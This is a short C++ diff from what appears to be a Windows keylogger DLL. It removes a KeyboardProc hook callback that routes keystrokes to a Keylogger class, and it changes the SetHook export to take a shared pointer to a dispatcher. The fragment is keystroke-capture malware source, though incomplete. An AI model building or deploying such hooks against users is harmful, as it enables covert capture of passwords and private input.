@@ -10,15 +10,7 @@ HHOOK g_hook[2] = { NULL, NULL };
 #pragma comment(linker,"/section:Shared,rws")
 HINSTANCE g_hInst = NULL;
 
-LRESULT __declspec(dllexport)__stdcall CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
-{
-	if (code < 0)
-		return CallNextHookEx(NULL, code, wParam, lParam);
-	return Keylogger::handleKey(code, wParam, lParam);
-	return CallNextHookEx(NULL, code, wParam, lParam);
-}
-
-extern "C" __declspec(dllexport) void SetHook(Dispatcher *disp)
+extern "C" __declspec(dllexport) void SetHook(std::shared_ptr<Dispatcher> disp)
 {
 	Keylogger::setDispatcher(disp);
 	if (g_hook[0] == NULL)
